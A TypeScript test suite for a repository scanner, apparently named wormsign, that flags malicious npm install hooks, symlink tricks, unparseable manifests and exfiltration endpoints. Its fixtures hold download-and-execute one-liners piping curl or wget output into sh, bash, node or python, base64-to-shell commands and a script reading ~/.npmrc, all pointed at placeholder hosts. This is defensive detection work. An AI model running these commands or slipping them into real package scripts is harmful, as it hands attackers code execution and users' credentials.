/**
 * Hostile-repo behaviour of `scan`: anything a package manager would act on but
 * wormsign could not check must surface as a finding (WS-SC-900), reads stay
 * inside the scan root, and adversarial input stays cheap.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { chmodSync, mkdirSync, mkdtempSync, symlinkSync, truncateSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { scanDirectory } from "../src/scan.js";
import type { ScanResult } from "../src/scan.js";
import { lineIndex, readText } from "../src/fsutil.js";
import { checkLifecycle, executedFiles, suspiciousReasons } from "../src/checks/lifecycle.js";
import { checkExfil } from "../src/checks/exfil.js";
import { checkInstalledPackage } from "../src/checks/nodemodules.js";
import type { ScanContext } from "../src/checks/context.js";
import { testCtx } from "./helpers.js";

function project(files: Record<string, string | Buffer>, links: Record<string, string> = {}): string {
  const d = mkdtempSync(join(tmpdir(), "ws-scan-"));
  for (const [p, c] of Object.entries(files)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    writeFileSync(join(d, p), c);
  }
  for (const [p, target] of Object.entries(links)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    symlinkSync(target, join(d, p));
  }
  return d;
}

const scan = (d: string, nodeModules = false, ctx: ScanContext = testCtx()): ScanResult => scanDirectory(d, ctx, { nodeModules });
const hits = (r: ScanResult, ruleId: string): string[] => r.findings.filter((f) => f.ruleId === ruleId).map((f) => f.file ?? "").sort();

const BOM = "﻿";
const EVIL_PKG = JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
const IOC_LOCK = JSON.stringify({
  lockfileVersion: 3,
  packages: {
    "": {},
    "node_modules/wormsign-test-marker": { version: "1.0.0", resolved: "https://registry.npmjs.org/wormsign-test-marker/-/wormsign-test-marker-1.0.0.tgz", integrity: "sha512-AAAA" },
  },
});
/** A local-spec finding's key without the digest of the full entry. */
const label = (key: string): string => key.replace(/=[0-9a-f]{32}$/, "");
const lc = (scripts: Record<string, string>) => checkLifecycle("package.json", JSON.stringify({ name: "x", scripts }), testCtx());
const ruleIds = (fs: { ruleId: string }[]) => fs.map((f) => f.ruleId).sort();

/* ---- install hooks beyond preinstall/install/postinstall ---- */

test("lifecycle: prepare-family and prepublish scripts (run by a local npm install) get content checks, not a presence finding", () => {
  assert.deepEqual(ruleIds(lc({ prepare: "curl -s https://a.invalid/x | sh" })), ["WS-LC-002"]);
  assert.deepEqual(ruleIds(lc({ preprepare: "node wormsign_marker_loader.js" })), ["WS-LC-003"]);
  assert.deepEqual(ruleIds(lc({ postprepare: "trufflehog filesystem /" })), ["WS-LC-002"]);
  assert.deepEqual(ruleIds(lc({ prepublish: "cat ~/.npmrc" })), ["WS-LC-002"]);
  assert.deepEqual(lc({ prepare: "husky", prepublishOnly: "curl -s https://a.invalid/x | sh" }), [], "prepublishOnly runs only on publish");
});

test("scan: manifests and lockfiles wormsign cannot parse are findings, outside node_modules only", () => {
  const d = project({
    "package.yaml": "scripts:\n  preinstall: curl -s https://a.invalid/x | sh\n",
    "a/package.json5": "{scripts: {preinstall: 'x'}}",
    "esc/package.yaml": '"scr\\x69pts":\n  preinstall: x\n',
    "bun.lock": "{}",
    "b/bun.lockb": "x",
    "node_modules/dep/package.yaml": "name: dep\n",
  });
  assert.deepEqual(hits(scan(d, true), "WS-SC-900"), ["a/package.json5", "b/bun.lockb", "bun.lock", "esc/package.yaml", "package.yaml"]);
});

test("scan: a package.yaml pnpm would not run scripts from is a note, not a finding", () => {
  const d = project({
    "hs/package.yaml": "name: hs\nversion: 0.1.0\ndependencies:\n  - base\nlibrary:\n  source-dirs: src\n",
    "web/package.yaml": "scripts:\n  preinstall: curl -s https://a.invalid/x | sh\n",
    "web/package.json": '{"name":"web"}',
  });
  const r = scan(d);
  assert.deepEqual(hits(r, "WS-SC-900"), []);
  assert.ok(r.notes.includes("skipped hs/package.yaml: it declares no scripts"), r.notes.join("\n"));
  assert.ok(r.notes.includes("skipped web/package.yaml: pnpm reads the package.json next to it instead"), r.notes.join("\n"));
});

test("scan: files named like Object.prototype members are not mistaken for unsupported manifests", () => {
  const d = project({ constructor: "x", __proto__: "x", "a/hasOwnProperty": "x" }, { toString: "constructor", valueOf: "a" });
  assert.deepEqual(hits(scan(d), "WS-SC-900"), []);
});

/* ---- byte-order marks: npm and pnpm strip them, so wormsign must too ---- */

test("scan: a BOM-prefixed package.json, lockfile or installed manifest is still checked", () => {
  const d = project({
    "package.json": BOM + EVIL_PKG,
    "package-lock.json": BOM + IOC_LOCK,
    "node_modules/wormsign-test-marker/package.json": BOM + JSON.stringify({ name: "wormsign-test-marker", version: "1.0.0" }),
  });
  const r = scan(d, true);
  assert.deepEqual(hits(r, "WS-LC-002"), ["package.json"]);
  assert.deepEqual(hits(r, "WS-LK-001"), ["node_modules/wormsign-test-marker/package.json", "package-lock.json"]);
  assert.deepEqual(hits(r, "WS-SC-900"), []);
});

/* ---- unreadable or unparseable files fail closed ---- */

test("scan: unparseable package.json, lockfile and installed manifest are high findings, not notes", () => {
  const d = project({ "package.json": "{oops", "package-lock.json": "{oops", "node_modules/dep/package.json": "{oops" });
  const r = scan(d, true);
  assert.deepEqual(hits(r, "WS-SC-900"), ["node_modules/dep/package.json", "package-lock.json", "package.json"]);
  assert.ok(r.findings.every((f) => f.severity === "high"));
});

test("scan: an oversized or binary manifest or workflow is a finding, and the workflow file-name IOC still fires", () => {
  const pad = " ".repeat(2 * 1024 * 1024);
  const d = project({
    "package.json": `{${pad}${EVIL_PKG.slice(1)}`, // EVIL_PKG is a JSON object: the padding goes inside its "{"
    "a/package.json": Buffer.from('{"name":"a"}\0'),
    ".github/workflows/wormsign-marker-workflow.yml": `on: push${pad}\n`,
    "dist/big.js": `x${pad}`,
  });
  const r = scan(d);
  assert.deepEqual(hits(r, "WS-SC-900"), [".github/workflows/wormsign-marker-workflow.yml", "a/package.json", "package.json"]);
  assert.deepEqual(hits(r, "WS-GH-001"), [".github/workflows/wormsign-marker-workflow.yml"]);
  // Searched in chunks for IOC endpoints only (WS-EX-002), and that is said; with none in it, it is not a finding.
  assert.ok(r.notes.some((n) => n.startsWith("searched dist/big.js for exfiltration endpoints from the IOC list only")), "a large ordinary file is only a note");
  assert.deepEqual(hits(r, "WS-SC-900").includes("dist/big.js"), false);
});

test("scan: lockfile reads are bounded, and an unreadable lockfile is a finding rather than silence", () => {
  const d = project({ "package-lock.json": "{}", "a/yarn.lock": "x" });
  truncateSync(join(d, "package-lock.json"), 64 * 1024 * 1024 + 1); // sparse: cheap to create
  if (process.getuid?.() !== 0) chmodSync(join(d, "a/yarn.lock"), 0o000);
  const r = scan(d);
  const msg = (file: string) => r.findings.find((f) => f.ruleId === "WS-SC-900" && f.file === file)?.message ?? "";
  assert.match(msg("package-lock.json"), /larger than 64 MiB/);
  if (process.getuid?.() !== 0) assert.match(msg("a/yarn.lock"), /could not be read \(EACCES\)/);
  chmodSync(join(d, "a/yarn.lock"), 0o644);
});

test("manifests that parse but are not objects (null, [], \"x\") are not checked, and do not crash the scan", () => {
  for (const text of ["null", "[]", '"x"', "1"]) {
    assert.deepEqual(ruleIds(checkLifecycle("package.json", text, testCtx())), ["WS-SC-900"], text);
    assert.deepEqual(ruleIds(checkInstalledPackage("node_modules/x/package.json", "/nonexistent/package.json", text, testCtx())), ["WS-SC-900"], text);
  }
  const r = scan(project({ "package.json": "null", "node_modules/x/package.json": "null", "package-lock.json": IOC_LOCK }), true);
  assert.deepEqual(hits(r, "WS-SC-900"), ["node_modules/x/package.json", "package.json"]);
  assert.deepEqual(hits(r, "WS-LK-001"), ["package-lock.json"], "the other findings survive");
});

/* ---- symlinks: package managers follow them, wormsign never does ---- */

test("scan: symlinked manifest, lockfile, workflow and .github are reported and never followed", () => {
  const outside = project({ "package.json": EVIL_PKG, "ci.yml": "x" });
  const d = project(
    { "cfg/manifest.json": EVIL_PKG, "docs/real.md": "x" },
    {
      "package.json": "cfg/manifest.json",
      "yarn.lock": join(outside, "package.json"),
      "a/.github/workflows/ci.yml": join(outside, "ci.yml"),
      "b/.github": outside,
      "docs/link.md": "real.md",
      "ignored/package.json": join(outside, "package.json"),
    },
  );
  const r = scanDirectory(d, testCtx(), { nodeModules: false, ignorePrefixes: ["ignored"] });
  assert.deepEqual(hits(r, "WS-SC-900"), ["a/.github/workflows/ci.yml", "b/.github", "package.json", "yarn.lock"]);
  assert.deepEqual(hits(r, "WS-LC-001"), [], "the link target must not be read as if it were the manifest");
});

test("scan: a symlinked directory outside the scanned tree is high when it is a package, low otherwise", () => {
  const outside = project({ "package.json": EVIL_PKG, "bin/tool": "" });
  const d = project(
    {
      "package.json": '{"name":"root","workspaces":["packages/*"]}',
      "node_modules/.cache/w/package.json": EVIL_PKG,
      "node_modules/.cache/x/a.js": "",
      "vendor/v/package.json": EVIL_PKG,
      "src/index.js": "",
    },
    {
      "packages/a": "../node_modules/.cache/w", // npm 10.9.2 ran this workspace's postinstall
      "packages/b": outside,
      "packages/c": "../vendor/v", // pnpm 11.16 ran a workspace linked into the repo
      "packages/d": "../src", // scanned at its real path, so not reported
      "packages/e": "../missing", // dangling: nothing to follow
      "packages/f": "../src/index.js", // a file link decides nothing
      "node_modules/g": ".cache/w", // pnpm's layout links inside node_modules
      "bazel-bin": join(outside, "bin"), // no package.json: followed only through a file: path inside it
      "public/vendor": "../node_modules/.cache/x",
    },
  );
  const r = scanDirectory(d, testCtx(), { nodeModules: true, ignorePrefixes: ["vendor"] });
  const sev = Object.fromEntries(r.findings.filter((f) => f.ruleId === "WS-SC-900").map((f) => [f.file, f.severity]));
  assert.deepEqual(sev, { "packages/a": "high", "packages/b": "high", "packages/c": "high", "bazel-bin": "low", "public/vendor": "low" });
  assert.match(r.findings.find((f) => f.file === "bazel-bin")?.message ?? "", /when a workspace pattern or a file: dependency names a package inside it/);
});

test("scan: a linked package directory whose package.json cannot be inspected is high, and the scan carries on", () => {
  // A committed self-loop makes stat(package.json) throw ELOOP; any repo can ship one.
  const d = project({ "package.json": EVIL_PKG }, { "node_modules/.cache/w/package.json": "package.json", vendor: "node_modules/.cache/w" });
  const r = scan(d);
  assert.equal(r.findings.find((f) => f.file === "vendor")?.severity, "high");
  assert.deepEqual(hits(r, "WS-LC-002"), ["package.json"], "the other findings survive");
});

test("scan: a directory that cannot be read is a high finding, not silence", { skip: process.platform === "win32" || process.getuid?.() === 0 }, () => {
  const d = project({ "package.json": "{}", "sub/package.json": EVIL_PKG, "listable/package.json": EVIL_PKG });
  chmodSync(join(d, "sub"), 0o000);
  chmodSync(join(d, "listable"), 0o444); // readdir works, lstat of each entry does not
  try {
    const r = scan(d);
    assert.deepEqual(hits(r, "WS-SC-900"), ["listable/package.json", "sub"]);
    assert.ok(r.findings.every((f) => /could not be read \(EACCES\)/.test(f.message)), r.findings.map((f) => f.message).join("\n"));
  } finally {
    chmodSync(join(d, "sub"), 0o755);
    chmodSync(join(d, "listable"), 0o755);
  }
});

test("lifecycle: a local dependency inside node_modules or .git, or a local tarball, is high, since npm runs its install scripts", () => {
  // npm 10.9.2 ran the postinstall of each: the package in node_modules/.cache/evil, and the one packed in vendor/x.tgz.
  const manifest = {
    name: "r",
    dependencies: { evil: "file:./node_modules/.cache/evil", ok: "file:./vendor/ok", reg: "^1.0.0", gh: "github:u/node_modules" },
    devDependencies: { t: "./node_modules/t.tgz", tar: "file:./vendor/x.tgz" },
    peerDependencies: { g: "file:.git/x" },
  };
  const d = project({ "package.json": JSON.stringify(manifest), "node_modules/.cache/evil/package.json": EVIL_PKG, "vendor/ok/package.json": "{}" });
  const unchecked = scan(d, true).findings.filter((f) => f.ruleId === "WS-SC-900"); // the deep scan does not reach node_modules/.cache/evil either
  assert.deepEqual(unchecked.map((f) => `${f.file} ${label(f.key)}`).sort(), ["dependencies:evil", "devDependencies:t", "devDependencies:tar", "peerDependencies:g"].map((k) => `package.json ${k}`));
  assert.ok(unchecked.every((f) => f.severity === "high"));
  const nested = checkLifecycle("packages/a/package.json", JSON.stringify({ dependencies: { e: "../../node_modules/.cache/evil" } }), testCtx());
  assert.deepEqual(nested.map((f) => label(f.key)), ["dependencies:e"]);
});

test("lifecycle: npm's other spellings of a hidden local path are caught, but git and registry specs are not", () => {
  // npm 10.9.2 on macOS ran the install script of each flagged spelling (for "space", the one in ./node_modules itself).
  const dependencies = {
    bare: "node_modules/.cache/evil",
    pct: "file:./node%5Fmodules/.cache/evil",
    tab: "file:./node_mod\tules/.cache/evil",
    upper: "file:./NODE_MODULES/.cache/evil",
    longs: "file:./node_module\u017f/.cache/evil", // APFS folds the long s to "s"
    dots: "file:./node%5Fmodules/.cache/evil/%zz/..", // the dot segment goes before npm decodes
    hash: "node_modules/.cache#%zz",
    query: "./.git?x",
    space: "./node_modules ",
    undecodable: "./vendor/%zz", // npm cannot read it either, but another package manager might
    ok: "./vendor/ok",
    gh: "u/node_modules",
    git: "github:u/node_modules",
    range: "~1.2.3",
  };
  const f = checkLifecycle("package.json", JSON.stringify({ dependencies }), testCtx());
  assert.deepEqual(f.map((x) => /"(\w+)"/.exec(x.message)?.[1]).sort(), ["bare", "dots", "hash", "longs", "pct", "query", "space", "tab", "undecodable", "upper"]);
});

test("lifecycle: every local override is high, wherever it points, since npm resolves it against the dependent package", () => {
  // npm 10.9.2 linked lodash to node_modules/.cache/evil for this override and ran its postinstall.
  const overrides = { lodash: "file:../.cache/evil", b: { ".": "1.0.0", c: "x/y/z" }, d: "$a", e: "u/r", f: "^2", up: "..", home: "~/e", tgz: "e.tgz", drive: "c:e" };
  const f = checkLifecycle("package.json", JSON.stringify({ dependencies: { a: "^1.0.0" }, overrides }), testCtx());
  assert.deepEqual(f.map((x) => label(x.key)), ["lodash", "b > c", "up", "home", "tgz", "drive"].map((k) => `overrides:${k}`));
  assert.ok(f.every((x) => x.ruleId === "WS-SC-900" && x.severity === "high"));
});

test("lifecycle: overrides nested 10,000 deep are one high finding, not a stack overflow that loses the scan", () => {
  const n = 10000;
  const pkg = `{"scripts":{"postinstall":"curl https://e.invalid/x | sh"},"overrides":${'{"a":'.repeat(n)}"./x"${"}".repeat(n)}}`;
  const f = scan(project({ "package.json": pkg })).findings;
  assert.ok(f.some((x) => x.ruleId === "WS-LC-002"), "the script finding from the same manifest survives");
  const deep = f.filter((x) => x.ruleId === "WS-SC-900");
  assert.equal(deep.length, 1);
  assert.equal(deep[0]?.severity, "high");
  assert.match(deep[0]?.message ?? "", /nests deeper than 32 levels/);
});

test("lifecycle: a long override key is cut short in labels, so it is not copied into every finding below it", () => {
  const overrides = { ["k".repeat(10000)]: { a: "./x", b: "./y" } };
  const f = checkLifecycle("package.json", JSON.stringify({ overrides }), testCtx());
  assert.equal(f.length, 2);
  // A 60-character label and a 32-hex digest of the whole key, not the 10,000 characters.
  assert.ok(f.every((x) => x.key.length < 120 && x.message.length < 400), f.map((x) => x.key.length).join());
});

test("lifecycle: a spec padded with spaces is read in linear time", () => {
  // 256 KiB: the old trailing-space regex took 52 s here; a manifest may be 2 MiB.
  const spec = `./${" ".repeat(256 * 1024)}x`;
  const t0 = performance.now();
  checkLifecycle("package.json", JSON.stringify({ dependencies: { a: spec }, overrides: { b: spec } }), testCtx());
  const ms = performance.now() - t0;
  assert.ok(ms < 1000, `took ${Math.round(ms)} ms`);
});

test("readText refuses a symlink, even one pointing inside the root", () => {
  const d = project({ "real.json": "{}" }, { "link.json": "real.json" });
  assert.deepEqual(readText(join(d, "real.json")), { text: "{}" });
  assert.deepEqual(readText(join(d, "link.json")), { problem: "it is a symlink" });
});

test("node_modules: binding.gyp is detected by lstat, so a symlink there counts without being followed", () => {
  const d = project({ "node_modules/g/package.json": JSON.stringify({ name: "g", version: "1.0.0" }) }, { "node_modules/g/binding.gyp": "/nonexistent/binding.gyp" });
  assert.deepEqual(
    scan(d, true).findings.filter((f) => f.ruleId === "WS-NM-001").map((f) => f.key),
    ["g@1.0.0:gyp"],
  );
});

/* ---- coverage notes ---- */

test("scan: says when the deep scan found nothing installed and when no lockfile was checked", () => {
  const r = scan(project({ "package.json": '{"name":"x","dependencies":{"wormsign-test-marker":"1.0.0"}}' }), true);
  assert.ok(r.notes.some((n) => /found no installed packages/.test(n)), r.notes.join("\n"));
  assert.ok(r.notes.some((n) => /no npm, pnpm or yarn lockfile found/.test(n)), r.notes.join("\n"));
  const withLock = scan(project({ "package.json": "{}", "package-lock.json": IOC_LOCK, "node_modules/a/package.json": '{"name":"a","version":"1.0.0"}' }), true);
  assert.ok(!withLock.notes.some((n) => /found no installed packages|no npm, pnpm or yarn lockfile/.test(n)), withLock.notes.join("\n"));
});

test("scan: hash IOCs without a published file name are listed as checked only with --hash-all", () => {
  const ctx = testCtx();
  ctx.iocs.hashes.push({ sha256: "0".repeat(64), name: "(runner memory scraper)", wave: "test", source: "https://example.test/synthetic-ioc" });
  const d = project({ "a.txt": "x" });
  assert.ok(scan(d, false, ctx).notes.some((n) => n.includes("1 hash IOC(s)") && n.includes("(runner memory scraper)")));
  assert.ok(!scanDirectory(d, { ...ctx, hashAll: true }, { nodeModules: false }).notes.some((n) => n.includes("hash IOC")));
  assert.ok(!scan(d).notes.some((n) => n.includes("hash IOC")), "named hashes are checked by default, so no note");
});

/* ---- payload file names (WS-FS-002) ---- */

test("scan: a payload file name with an unknown hash is reported at its name-only severity; an 'info' name is not", () => {
  const r = scan(project({ "wormsign_marker_loader.js": "// different bytes from the known sample\n", "bundle.js": "console.log(1)\n" }));
  const fs2 = r.findings.filter((f) => f.ruleId === "WS-FS-002");
  assert.equal(fs2.length, 1);
  assert.equal(fs2[0]?.file, "wormsign_marker_loader.js");
  assert.equal(fs2[0]?.severity, "high");
  assert.match(fs2[0]?.message ?? "", /verify the content/);
  assert.match(fs2[0]?.source ?? "", /^https:\/\//);
  assert.equal(hits(r, "WS-FS-001").length, 0);
  assert.deepEqual(r.findings.filter((f) => f.file === "bundle.js"), []);
});

/* ---- exfil ---- */

test("exfil: IOC endpoints match regardless of host case, also in node_modules mode, without a generic duplicate", () => {
  const ctx = testCtx();
  assert.deepEqual(ruleIds(checkExfil("a.js", 'f("https://WORMSIGN-MARKER.INVALID/collect")', ctx, { iocOnly: true })), ["WS-EX-002"]);
  ctx.iocs.endpoints.push({ substring: "webhook.site/wormsign-test", severity: "critical", wave: "test", source: "https://example.test/synthetic-ioc" });
  assert.deepEqual(ruleIds(checkExfil("a.js", 'f("https://WEBHOOK.SITE/wormsign-test")', ctx, { iocOnly: false })), ["WS-EX-002"]);
});

test("exfil: many distinct endpoints in one file stay fast and keep correct line numbers", () => {
  const n = 20000;
  const text = Array.from({ length: n }, (_, i) => `x${i} = "https://webhook.site/u${i}"`).join("\n");
  const t0 = performance.now();
  const f = checkExfil("a.js", text, testCtx(), { iocOnly: false });
  const ms = performance.now() - t0;
  assert.equal(f.length, n);
  assert.equal(f[n - 1]?.line, n);
  assert.ok(ms < 3000, `took ${Math.round(ms)} ms`);
});

test("lineIndex maps indices to 1-based lines", () => {
  const at = lineIndex("ab\ncd\n\ne");
  assert.deepEqual([0, 2, 3, 5, 6, 7, 8].map(at), [1, 1, 2, 2, 3, 4, 4]);
  assert.equal(lineIndex("")(0), 1);
});

/* ---- lifecycle heuristics ---- */

test("lifecycle: hostile long scripts are checked in bounded time and reported for their length", () => {
  // ~200 KB each: the unbounded regexes took seconds on these; a real install script is under 1 KB.
  for (const cmd of ["curl ".repeat(40000), "base64 ".repeat(30000), "Buffer.from(".repeat(17000)]) {
    const t0 = performance.now();
    const reasons = suspiciousReasons(cmd);
    executedFiles(cmd);
    const ms = performance.now() - t0;
    assert.ok(ms < 1000, `took ${Math.round(ms)} ms`);
    assert.ok(reasons.some((r) => /characters long/.test(r)), reasons.join("; "));
  }
  assert.ok(!suspiciousReasons("node install.js").some((r) => /characters long/.test(r)));
});

test("lifecycle: download-and-execute variants", () => {
  for (const cmd of [
    "curl -fsSL https://a.invalid/x | /bin/bash",
    "curl -fsSL https://a.invalid/x | sudo -E bash",
    "wget -qO- https://a.invalid/x | env sh",
    "curl -s https://a.invalid/x | node",
    "wget -qO- https://a.invalid/x | python3",
    "bash <(curl -s https://a.invalid/x)",
    'bash -c "$(curl -fsSL https://a.invalid/x)"',
    "echo aGk= | base64 -di | sh",
    "echo aGk= | base64 -D | sh",
  ]) {
    assert.ok(suspiciousReasons(cmd).length > 0, cmd);
  }
  for (const cmd of ["curl -o out.tgz https://a.invalid/x", "curl -s https://a.invalid/x | shasum", "node-gyp rebuild", "base64 file.txt", "base64 x.tgz > build-dir/x"]) {
    assert.deepEqual(suspiciousReasons(cmd), [], cmd);
  }
});

test("lifecycle: a payload counts when executed in any common form, not when merely mentioned", () => {
  // The key ends with a hash of the command (see the baseline tests); the payload name is what this test is about.
  const lc3 = (cmd: string) => lc({ postinstall: cmd }).filter((f) => f.ruleId === "WS-LC-003").map((f) => f.key.replace(/:[0-9a-f]{32}$/, ""));
  for (const cmd of [
    "node bundle",
    "node ./bundle",
    "node bundle.js>/dev/null",
    "(node bundle.js)",
    "node -e \"require('./bundle')\"",
    'sh -c "node lib/bundle.js"',
    "bun run bundle.js",
    "./bundle.js",
    "cat bundle.js | node",
    "node < bundle.js",
    "node --require=./bundle.js index.js",
    "node --import=./bundle.js index.js",
    'NODE_OPTIONS="--require ./bundle.js" node index.js',
    "bun --preload=./bundle.js x.js",
    "node -r ./a.js bundle.js",
    "node --loader x bundle.js",
    "node --max-old-space-size 4096 bundle.js",
    "npx tsx bundle.js",
    "ts-node bundle.js",
  ]) {
    assert.deepEqual(lc3(cmd), ["postinstall:bundle.js"], cmd);
  }
  // Output positions name a file being written. A bare `bundle` is a script name to npm and bun, not bundle.js.
  for (const cmd of [
    "esbuild src/index.ts --bundle --outfile=dist/bundle.js",
    "esbuild src/index.ts --bundle --outfile dist/bundle.js",
    "babel src --out-file bundle.js",
    "webpack -o bundle.js",
    "echo x > bundle.js",
    "node gen.js 2>&1 >>dist/bundle.js",
    "node mybundle.js",
    "node bundle.cjs",
    "bun run bundle",
    "npm run bundle",
    "sh bundle",
  ]) {
    assert.deepEqual(lc3(cmd), [], cmd);
  }
});
